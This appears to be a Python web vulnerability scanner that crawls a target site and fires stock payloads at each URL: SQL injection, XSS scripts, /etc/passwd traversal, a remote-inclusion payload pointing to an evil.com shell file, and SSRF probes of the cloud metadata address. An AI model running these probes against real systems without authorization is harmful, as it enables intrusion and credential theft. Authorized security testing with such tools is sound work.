import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re
import argparse
import concurrent.futures
import json
import os
import sys
from tqdm import tqdm

class WebVulnerabilityScanner:
    def __init__(self, target_url, headers=None, timeout=10, threads=10):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update(headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        })
        self.timeout = timeout
        self.threads = threads
        self.vulnerabilities = []
        self.discovered_urls = set()
        self.crawled_urls = set()
        
    def load_payloads(self, payload_file):
        """Load payloads from JSON file"""
        try:
            with open(payload_file) as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading payloads: {e}")
            return {}
    
    def crawl(self, url=None):
        """Basic web crawler to discover URLs"""
        if url is None:
            url = self.target_url
            
        if url in self.crawled_urls:
            return
        self.crawled_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract all links
            for link in soup.find_all('a', href=True):
                absolute_url = urljoin(url, link['href'])
                if self.target_url in absolute_url and absolute_url not in self.discovered_urls:
                    self.discovered_urls.add(absolute_url)
                    self.crawl(absolute_url)
                    
            # Extract forms
            for form in soup.find_all('form'):
                form_action = form.get('action')
                if form_action:
                    absolute_url = urljoin(url, form_action)
                    if self.target_url in absolute_url and absolute_url not in self.discovered_urls:
                        self.discovered_urls.add(absolute_url)
                        
        except Exception as e:
            print(f"Error crawling {url}: {e}")
    
    def scan_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        payloads = self.load_payloads('sql_payloads.json') or {
            'sqli': ["'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", "OR 1=1"]
        }
        
        try:
            for payload in payloads['sqli']:
                test_url = f"{url}?id={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                if any(error in response.text for error in ['SQL syntax', 'MySQL server', 'syntax error']):
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'SQL Injection',
                        'payload': payload,
                        'confidence': 'High'
                    })
                    break
        except Exception as e:
            print(f"Error testing SQLi on {url}: {e}")
    
    def scan_xss(self, url):
        """Check for XSS vulnerabilities"""
        payloads = self.load_payloads('xss_payloads.json') or {
            'xss': ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", 
                   "\"><script>alert('XSS')</script>", "javascript:alert('XSS')"]
        }
        
        try:
            for payload in payloads['xss']:
                test_url = f"{url}?q={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                if payload in response.text:
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'Cross-Site Scripting (XSS)',
                        'payload': payload,
                        'confidence': 'High'
                    })
                    break
        except Exception as e:
            print(f"Error testing XSS on {url}: {e}")
    
    def scan_lfi_rfi(self, url):
        """Check for Local/Remote File Inclusion vulnerabilities"""
        payloads = self.load_payloads('lfi_payloads.json') or {
            'lfi': ["../../../../etc/passwd", "....//....//....//....//etc/passwd",
                   "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
            'rfi': ["http://evil.com/shell.txt"]
        }
        
        try:
            # Test LFI
            for payload in payloads['lfi']:
                test_url = f"{url}?file={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                if "root:" in response.text:
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'Local File Inclusion (LFI)',
                        'payload': payload,
                        'confidence': 'High'
                    })
                    break
            
            # Test RFI
            for payload in payloads['rfi']:
                test_url = f"{url}?url={payload}"
                try:
                    response = self.session.get(test_url, timeout=2)
                    if "evil.com" in response.text:
                        self.vulnerabilities.append({
                            'url': url,
                            'type': 'Remote File Inclusion (RFI)',
                            'payload': payload,
                            'confidence': 'Medium'
                        })
                        break
                except:
                    continue
        except Exception as e:
            print(f"Error testing LFI/RFI on {url}: {e}")
    
    def scan_ssrf(self, url):
        """Check for Server-Side Request Forgery vulnerabilities"""
        payloads = self.load_payloads('ssrf_payloads.json') or {
            'ssrf': ["http://localhost", "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"]
        }
        
        try:
            for payload in payloads['ssrf']:
                test_url = f"{url}?url={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
                if any(ip in response.text for ip in ['127.0.0.1', 'localhost']):
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'Server-Side Request Forgery (SSRF)',
                        'payload': payload,
                        'confidence': 'High'
                    })
                    break
        except Exception as e:
            print(f"Error testing SSRF on {url}: {e}")
    
    def scan_open_redirect(self, url):
        """Check for Open Redirect vulnerabilities"""
        payloads = self.load_payloads('redirect_payloads.json') or {
            'redirect': ["http://evil.com", "//evil.com", "/\\evil.com"]
        }
        
        try:
            for payload in payloads['redirect']:
                test_url = f"{url}?redirect={payload}"
                response = self.session.get(test_url, allow_redirects=False, timeout=self.timeout)
                if response.status_code in [301, 302, 303, 307, 308] and "evil.com" in response.headers.get('Location', ''):
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'Open Redirect',
                        'payload': payload,
                        'confidence': 'Medium'
                    })
                    break
        except Exception as e:
            print(f"Error testing Open Redirect on {url}: {e}")
    
    def scan_cors(self, url):
        """Check for CORS misconfigurations"""
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'GET'
            }
            response = self.session.get(url, headers=headers, timeout=self.timeout)
            
            if 'Access-Control-Allow-Origin' in response.headers:
                if response.headers['Access-Control-Allow-Origin'] == '*' or 'evil.com' in response.headers['Access-Control-Allow-Origin']:
                    self.vulnerabilities.append({
                        'url': url,
                        'type': 'CORS Misconfiguration',
                        'payload': 'Origin: https://evil.com',
                        'confidence': 'High' if response.headers['Access-Control-Allow-Origin'] == '*' else 'Medium'
                    })
        except Exception as e:
            print(f"Error testing CORS on {url}: {e}")
    
    def scan_headers(self, url):
        """Check for security-related HTTP headers"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            headers = response.headers
            
            missing_headers = []
            if 'X-XSS-Protection' not in headers:
                missing_headers.append('X-XSS-Protection')
            if 'X-Content-Type-Options' not in headers:
                missing_headers.append('X-Content-Type-Options')
            if 'X-Frame-Options' not in headers:
                missing_headers.append('X-Frame-Options')
            if 'Content-Security-Policy' not in headers:
                missing_headers.append('Content-Security-Policy')
            if 'Strict-Transport-Security' not in headers and not url.startswith('http://'):
                missing_headers.append('Strict-Transport-Security')
            
            if missing_headers:
                self.vulnerabilities.append({
                    'url': url,
                    'type': 'Missing Security Headers',
                    'payload': ', '.join(missing_headers),
                    'confidence': 'Low'
                })
        except Exception as e:
            print(f"Error checking headers on {url}: {e}")
    
    def scan_clickjacking(self, url):
        """Check for Clickjacking vulnerability"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            if 'X-Frame-Options' not in response.headers:
                self.vulnerabilities.append({
                    'url': url,
                    'type': 'Clickjacking',
                    'payload': 'Missing X-Frame-Options header',
                    'confidence': 'Medium'
                })
        except Exception as e:
            print(f"Error testing Clickjacking on {url}: {e}")
    
    def scan_directory_listing(self, url):
        """Check for Directory Listing vulnerability"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            if 'Index of /' in response.text or '<title>Directory listing for /' in response.text:
                self.vulnerabilities.append({
                    'url': url,
                    'type': 'Directory Listing',
                    'payload': 'Directory listing enabled',
                    'confidence': 'Medium'
                })
        except Exception as e:
            print(f"Error testing Directory Listing on {url}: {e}")
    
    def scan_all(self):
        """Run all vulnerability scans on discovered URLs"""
        print(f"[*] Crawling {self.target_url} to discover URLs...")
        self.crawl()
        
        print(f"[*] Found {len(self.discovered_urls)} URLs to scan")
        print("[*] Starting vulnerability scanning...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for url in self.discovered_urls:
                futures.append(executor.submit(self.scan_sql_injection, url))
                futures.append(executor.submit(self.scan_xss, url))
                futures.append(executor.submit(self.scan_lfi_rfi, url))
                futures.append(executor.submit(self.scan_ssrf, url))
                futures.append(executor.submit(self.scan_open_redirect, url))
                futures.append(executor.submit(self.scan_cors, url))
                futures.append(executor.submit(self.scan_headers, url))
                futures.append(executor.submit(self.scan_clickjacking, url))
                futures.append(executor.submit(self.scan_directory_listing, url))
            
            # Progress bar
            for _ in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Scanning"):
                pass
        
        print("[*] Scanning completed!")
        return self.vulnerabilities

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use')
    parser.add_argument('-o', '--output', help='Output file to save results')
    args = parser.parse_args()
    
    scanner = WebVulnerabilityScanner(args.url, threads=args.threads)
    vulnerabilities = scanner.scan_all()
    
    if vulnerabilities:
        print("\n[!] Found vulnerabilities:")
        for vuln in vulnerabilities:
            print(f"\n[+] {vuln['type']} at {vuln['url']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Confidence: {vuln['confidence']}")
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(vulnerabilities, f, indent=2)
            print(f"\n[+] Results saved to {args.output}")
    else:
        print("\n[-] No vulnerabilities found")

if __name__ == '__main__':
    main()
